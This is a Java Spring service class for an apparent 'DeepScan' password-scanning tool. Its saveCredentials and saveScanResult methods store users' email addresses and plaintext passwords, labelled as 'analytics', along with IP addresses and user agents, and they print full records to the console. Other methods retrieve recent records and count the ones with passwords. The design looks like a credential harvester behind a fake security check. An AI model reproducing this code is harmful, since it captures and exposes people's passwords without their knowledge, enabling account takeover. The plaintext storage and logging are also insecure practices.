package com.deepscan.service;

import com.deepscan.model.AnalyticsRecord;
import com.deepscan.repository.AnalyticsRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import jakarta.servlet.http.HttpServletRequest;
import java.util.List;

@Service
public class AnalyticsService {

    @Autowired
    private AnalyticsRepository analyticsRepository;

    @Autowired
    private HttpServletRequest request;

    public AnalyticsRecord saveCredentials(String email, String password) {
        try {
            AnalyticsRecord record = new AnalyticsRecord(email, password);

            // Add request info for better analytics
            String userAgent = request.getHeader("User-Agent");
            String ipAddress = getClientIpAddress();

            record.setUserAgent(userAgent != null ? userAgent.substring(0, Math.min(userAgent.length(), 500)) : "Unknown");
            record.setIpAddress(ipAddress);

            System.out.println("Saving analytics record: " + record);

            AnalyticsRecord savedRecord = analyticsRepository.save(record);
            System.out.println("Successfully saved record with ID: " + savedRecord.getId());

            return savedRecord;

        } catch (Exception e) {
            System.err.println("Error saving analytics: " + e.getMessage());
            e.printStackTrace();
            throw new RuntimeException("Failed to save analytics: " + e.getMessage(), e);
        }
    }

    // NEW METHOD: Save enhanced scan results
    public AnalyticsRecord saveScanResult(String email, String password, String scanType, Integer riskScore, Boolean compromised) {
        try {
            AnalyticsRecord record = new AnalyticsRecord();
            record.setEmail(email);
            record.setPasswordText(password);
            record.setPasswordProvided(password != null && !password.trim().isEmpty());
            record.setScanType(scanType);
            record.setRiskScore(riskScore);
            record.setCompromised(compromised);

            // Set breach count based on compromised status
            if (compromised != null && compromised) {
                record.setBreachCount(riskScore != null ? Math.max(1, riskScore / 10) : 1);
            } else {
                record.setBreachCount(0);
            }

            // Add request info
            String userAgent = request.getHeader("User-Agent");
            String ipAddress = getClientIpAddress();

            record.setUserAgent(userAgent != null ? userAgent.substring(0, Math.min(userAgent.length(), 500)) : "Unknown");
            record.setIpAddress(ipAddress);
            record.setAdditionalData("Enhanced security scan - Risk: " + riskScore + "%");

            System.out.println("Saving scan result analytics: " + record);

            AnalyticsRecord savedRecord = analyticsRepository.save(record);
            System.out.println("Successfully saved scan result with ID: " + savedRecord.getId());

            return savedRecord;

        } catch (Exception e) {
            System.err.println("Error saving scan result analytics: " + e.getMessage());
            e.printStackTrace();
            throw new RuntimeException("Failed to save scan result: " + e.getMessage(), e);
        }
    }

    public long getTotalRecords() {
        return analyticsRepository.count();
    }

    public long getPasswordProvidedCount() {
        return analyticsRepository.countByPasswordProvided();
    }

    public List<AnalyticsRecord> getRecentRecords(int limit) {
        return analyticsRepository.findAllOrderByCreatedAtDesc().stream()
                .limit(limit)
                .toList();
    }

    private String getClientIpAddress() {
        String xfHeader = request.getHeader("X-Forwarded-For");
        if (xfHeader != null && !xfHeader.isEmpty()) {
            return xfHeader.split(",")[0];
        }
        return request.getRemoteAddr();
    }
}